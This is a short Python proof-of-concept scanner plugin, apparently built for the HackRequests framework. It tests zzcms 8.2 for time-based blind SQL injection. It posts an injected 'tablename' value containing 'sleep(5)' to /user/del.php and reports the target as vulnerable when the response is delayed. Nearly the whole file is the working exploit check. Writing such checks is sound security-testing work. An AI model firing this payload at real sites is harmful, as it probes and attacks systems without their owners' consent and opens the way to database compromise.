# Author:w8ay
# Name:测试DEMO

import HackRequests
import time

def poc(arg, **kwargs):
    payloads = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'  # 匹配用的字符串
    url = arg + "/user/del.php"
    startTime = time.time()
    post_data = "id=1&tablename=zzcms_answer where id = 1 and sleep(5)%23"
    hh = HackRequests.http(url)
    if hh.status_code != 200 or time.time() - startTime > 5:
        return False
    startTime = time.time()
    hh = HackRequests.http(url,post = post_data)

    if hh.status_code == 200 and time.time() - startTime > 5:
        result = {
            "name": "zzscms 8.2 sqli_inject",  # 插件名称
            "content": "zzcms v8.2 /user/del.php 存在SQL Inject,referer:http://www.freebuf.com/vuls/161888.html",  # 插件返回内容详情，会造成什么后果。
            "url": url,  # 漏洞存在url
            "log": hh.log,
            "tag": "sqli"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass